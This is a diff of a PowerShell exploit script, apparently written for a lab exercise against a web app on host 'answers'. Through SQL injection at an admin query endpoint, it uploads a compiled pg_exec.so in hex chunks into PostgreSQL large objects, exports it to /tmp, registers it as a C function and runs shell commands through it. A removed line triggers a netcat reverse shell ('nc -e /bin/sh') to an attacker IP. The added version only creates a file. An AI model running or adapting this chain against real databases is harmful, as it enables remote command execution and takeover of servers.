@@ -167,12 +167,13 @@ $xxe_payload = @"
 
 
       # 2. convert to hex string
-      $postgres_so_bytes = [System.IO.File]::ReadAllBytes("pg_exec.so");
+      <#$postgres_so_bytes = [System.IO.File]::ReadAllBytes("pg_exec.so");
       $postgres_so_text = [System.Text.Encoding]::ASCII.GetString($postgres_so_bytes);
       $postgres_so_hex_string = '';
       foreach($char in $postgres_so_text.ToCharArray()) {
         $postgres_so_hex_string = $postgres_so_hex_string + [System.String]::Format("{0:X2}", [System.Convert]::ToUInt32($char));
       }
+      #>
 
 
       # 3. write to database via /admin/query
@@ -188,34 +189,37 @@ $xxe_payload = @"
       #$create_lo_sqli = "SELECT lo_import(`$`$/etc/passwd`$`$,$loid)";
       #$res = Invoke-WebRequest -Uri http://answers/admin/query -Method Post -Body "adminKey=$admin_key&query=$create_lo_sqli" -Websession $Session -Proxy http://localhost:8080;
       # 3c. inject_udf
+
+      #test
+      $postgres_so_hex_string = gc -raw temp1.txt;
+
       $loop_end =  [Math]::Floor([decimal](($postgres_so_hex_string.length - 1) / 4096 + 1));
+      $chunk_length = [Math]::Floor([decimal]($postgres_so_hex_string.length / $loop_end));
       Write-Output "loop end: $loop_end";
       #Write-Output "loop end divided by 4096: $($loop_end/4096)";
+      $postgres_so_hex_string
       Write-Output "Length hex string length: $($postgres_so_hex_string.length)";
-      Write-Output "udf chunk length: $($postgres_so_hex_string.length / $loop_end)";
-      Write-Output "udf chunk length: $($postgres_so_hex_string.length / 4096)";
-      #test
-      $postgres_so_hex_string = gc -raw temp.txt;
-      for($i = 0; $i -lt $loop_end; ++$i) {
-        $chunk_length = $postgres_so_hex_string.length / $loop_end;
-        $udf_chunk = $postgres_so_hex_string.substring($i*$chunk_length, $chunk_length);
-        if ($i -eq 0) {
-          $write_udf_chunk_sqli = "UPDATE PG_LARGEOBJECT SET data=decode(`$`$$udf_chunk`$`$, `$`$hex`$`$) where loid=$loid and pageno=$i";
-        }
-        else {
-          $write_udf_chunk_sqli = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ($loid, $i, decode(`$`$$udf_chunk`$`$, `$`$hex`$`$))";
-        }
-        #$req_body = "adminKey=$admin_key&query=" + [System.Web.HttpUtility]::UrlEncode($write_udf_chunk_sqli);
+      Write-Output "udf chunk length: $chunk_length";
+      #for (int i = 0; i < str.Length; i += maxChunkSize) 
+      #  yield return str.Substring(i, Math.Min(maxChunkSize, str.Length-i));
+      $chunk_length = 4096;
+      $j=0;
+      for($i = 0; $i -lt $postgres_so_hex_string.length; $i+=$chunk_length) {
+        $udf_chunk = $postgres_so_hex_string.substring($i, [Math]::Min($chunk_length, $postgres_so_hex_string.length - $i));
+        $write_udf_chunk_sqli = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ($loid, $j, decode(`$`$$udf_chunk`$`$, `$`$hex`$`$))";
         $req_body = "adminKey=$admin_key&query=" + $($write_udf_chunk_sqli -replace ' ','+');
         $res = Invoke-WebRequest -Uri http://answers/admin/query -Method Post -Body $req_body -Websession $Session -Proxy http://localhost:8080;
+        $j = $j +1;
       }
       # 3d. export_udf
       $export_udf_sqli = "SELECT lo_export($loid, `$`$/tmp/pg_exec.so`$`$)";
       $res = Invoke-WebRequest -Uri http://answers/admin/query -Method Post -Body "adminKey=$admin_key&query=$export_udf_sqli" -Websession $Session -Proxy http://localhost:8080;
       # 3e. create_udf_func
       $create_udf_func_sqli = "CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT";
+      $res = Invoke-WebRequest -Uri http://answers/admin/query -Method Post -Body "adminKey=$admin_key&query=$create_udf_func_sqli" -Websession $Session -Proxy http://localhost:8080;
       # 3f. trigger_udf
-      $trigger_udf_sqli = "SELECT sys('nc -e /bin/sh $attacker_ip 4444');"
+      $trigger_udf_sqli = "SELECT sys('touch /tmp/gotcha.txt');"
+      $res = Invoke-WebRequest -Uri http://answers/admin/query -Method Post -Body "adminKey=$admin_key&query=$trigger_udf_sqli" -Websession $Session -Proxy http://localhost:8080;
       break;
     }
   }
